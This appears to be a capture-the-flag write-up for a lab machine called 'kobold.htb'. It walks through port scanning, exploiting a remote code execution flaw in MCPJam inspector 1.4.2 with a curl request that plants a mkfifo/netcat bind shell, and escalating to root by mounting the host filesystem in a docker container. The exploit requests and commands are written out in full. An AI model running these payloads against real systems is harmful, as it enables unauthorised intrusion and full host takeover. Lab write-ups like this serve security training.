Ok so i used my recon.sh script to automate the scan

```bash
cat summary.txt                                                                   
============================================
  RECON SUMMARY
  Target:    10.129.15.69
  DNS:       kobold.htb
  Generated: 2026-03-27 12:18:22
============================================

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp   ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
  80/tcp   http         nginx 1.24.0 (Ubuntu)
  443/tcp  ssl/http     nginx 1.24.0 (Ubuntu)
  3552/tcp http         Golang net/http server

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   80 3552
  HTTPS:  443

--------------------------------------------
  SUBDOMAINS  (2 found)
--------------------------------------------
  bin.kobold.htb
  mcp.kobold.htb

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------
  

============================================
```

So we got a website and ssh. We also found 2 subdomains which are automatically added to our /etc/hosts
I went to the http://kobold.htb and it was a login screen for arcane which is something to do with containers n stuff like that. I tried lookng for a cve for that specific version of 1.13.0 and I found nothing. I decided to check out the subdomain of mcp first.

Ok so its MCPJAM version v1.4.2
https://nvd.nist.gov/vuln/detail/CVE-2026-23744


There is an RCE vulnerability for it. Let's see.

```bash
Description

MCPJam inspector is the local-first development platform for MCP servers. Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE. Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request. Version 1.4.3 contains a patch.
```

I tested the vulnerability with this command
```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"sh","args":["-c","sleep 10"]},"serverId":"test1"}'
```
And it took very long so we know that the sleep method worked and we have a working cve. Now we just have to make it into a RCE.


```bash
curl -k https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"sh","args": ["-c","while true; do mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc -lvnp 4444 > /tmp/f; rm /tmp/f; done"]},"serverId":"test1"}'




 nc mcp.kobold.htb 4444
sh: 0: can't access tty; job control turned off
$ whoami
ben
$ 
```

Nice now we got a shell.

Let's make it more interactive
```bash
script /dev/null -c /bin/bash
```

I didn't find anything interesting so i imported linpeas over to see if there is something that im missing.

After many hours i figured out that we were able to add ourselves to the docker group since we didn't have access to it.

```bash
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ docker images
docker images
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   7 weeks ago    922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
```

These are the images that are on the docker.


```bash
docker run -it --entrypoint sh -u 0 -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```

We run this command which is just a basic command to run the image but with a few tweaks. Most importantly the flag entrypoint just overrides the default program and just suns sh

then the -u means that we are root and then -v mounts the root folder to the /mnt.  Then when the code is ran we are able to go to the /mnt and see that its the entirety of the / in there. And we can just cd into /root and get the flag.


